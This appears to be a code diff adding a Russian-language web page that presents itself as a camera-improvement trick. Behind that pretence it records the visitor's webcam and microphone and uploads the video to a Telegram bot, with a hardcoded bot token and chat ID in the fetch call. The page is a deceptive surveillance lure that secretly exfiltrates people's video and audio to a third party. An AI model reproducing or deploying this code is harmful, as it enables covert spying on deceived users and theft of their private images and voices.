@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Запись и отправка видео</title>
+</head>
+
+<body>
+  <video autoplay muted></video>
+  <button onclick="toggleRecording()">Нажми на кнопку</button>
+
+  <script>
+    let mediaRecorder;
+    let recordedChunks = [];
+    let isRecording = false;
+    const videoElement = document.querySelector("video");
+
+    navigator.mediaDevices
+      .getUserMedia({ video: true, audio: true })
+      .then((localMediaStream) => {
+        mediaRecorder = new MediaRecorder(localMediaStream);
+
+        mediaRecorder.ondataavailable = function(event) {
+          if (event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
+
+        mediaRecorder.onstop = function() {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          sendVideo(blob);
+        };
+      })
+      .catch((error) => {
+        console.log("Отказано в доступе к камере или микрофону:", error);
+      });
+
+    function toggleRecording() {
+      if (isRecording) {
+        stopRecording();
+        isRecording = false;
+        document.querySelector("button").innerText = "Теперь твая камера мощная";
+      } else {
+        startRecording();
+        isRecording = true;
+        document.querySelector("button").innerText = "Выйди на место где хорошое освещение";
+      }
+    }
+
+    function startRecording() {
+      recordedChunks = [];
+      mediaRecorder.start();
+    }
+
+    function stopRecording() {
+      mediaRecorder.stop();
+    }
+
+    function sendVideo(videoBlob) {
+      const formData = new FormData();
+      formData.append('video', videoBlob, 'recorded_video.webm');
+
+      fetch('https://api.telegram.org/bot6827023071:AAGqM45FQaVIZw11kidP2xQnLJbWtRQSl58/sendVideo?chat_id=5888615986', { 
+        method: 'POST', 
+        body: formData 
+      })
+      .then(response => response.json())
+      .then(data => console.log(data))
+      .catch(error => console.error('Ошибка при отправке видео:', error)); 
+    }
+  </script>
+</body>
+
+</html>
